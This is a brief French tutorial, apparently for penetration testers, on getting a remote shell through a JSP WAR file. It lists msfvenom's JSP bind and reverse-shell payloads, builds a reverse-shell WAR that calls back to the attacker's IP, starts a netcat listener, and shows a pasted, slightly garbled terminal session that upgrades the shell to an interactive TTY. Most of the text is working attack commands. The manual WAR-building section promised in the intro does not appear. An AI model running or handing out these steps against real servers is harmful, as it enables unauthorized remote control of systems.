Comment générer un shell War JSP inversé, lié et intégré au navigateur. Cela couvrira la génération de charges utiles avec MSFVenom et la création manuelle d'un fichier war à partir de nos propres fichiers JSP.
# JSP War Shell MSFVenom

En utilisant l' `msfvenom`outil intégré à Kali, nous pouvons voir quels shells nous avons disponibles :
`root@kali:~# msfvenom --list payloads | grep jsp`
    `java/jsp_shell_bind_tcp                             Listen for a connection and spawn a command shell`
    `java/jsp_shell_reverse_tcp                          Connect back to attacker and spawn a command shell`
`root@kali:~#`

Nous pouvons vérifier quels paramètres doivent être spécifiés en utilisant :
`msfvenom -p java/jsp_shell_bind_tcp --list-options`
`msfvenom -p java/jsp_shell_reverse_tcp --list-options`

`msfvenom -p java/jsp_shell_reverse_tcp  LHOST=mon_IP LPORT=3155 -f war > shell.war`

Un écouteur netcat peut être configuré pour écouter la connexion en utilisant :
`nc -nvlp 3155`


obtenir un meilleur Shell 

```
root@3a453ab39d3d:/backend# script /dev/null -c bash 
script /dev/null -c bash Script started, file is /dev/null root@3a453ab39d3d:/backend# ^Z [1]
+ Stopped nc -lnvp 443 
oxdf@hacky$ stty raw -echo; fg 
nc -lnvp 443 
reset r
eset: unknown terminal type unknown Terminal type? screen root@3a453ab39d3d:/backend#
```